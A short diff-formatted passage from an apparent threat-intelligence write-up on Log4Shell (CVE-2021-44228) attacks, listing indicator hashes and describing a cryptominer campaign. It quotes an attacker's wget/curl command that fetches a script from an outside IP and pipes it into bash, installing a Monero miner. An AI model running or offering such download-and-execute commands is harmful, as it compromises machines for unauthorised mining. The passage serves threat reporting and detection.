@@ -1,0 +1,4 @@
+
+in ProgramFiles folder) as a host and infects it by injecting its malicious code making that file also capable of in fecting other executables.
+70ffac4b8f2cf00a6876b3aa622c0efa87b53b681791302eea27692dd81f273d *ExecTemplateJDK8.class 85e88e7bdd4657422a121146600c71250d68b44a82b9677856ffda9dbec07d98 *log4tst.exe CryptoMiners First sighting exploiting CVE-2021-44228: 2021-12-11 A lot of the attacks also install CryptoMiner such as the following: They utilize the JNDIExploit tool to execute the following on the target: echo &(wget -O - http://209[.]141.58.149:8005/aa0||curl -o - http://209[.]141.58.149:8005/
+aa0)|/bin/bash The target downloads a shell script with filename aa0 which will then downloads an ELF binary, lz, a Monero Miner.
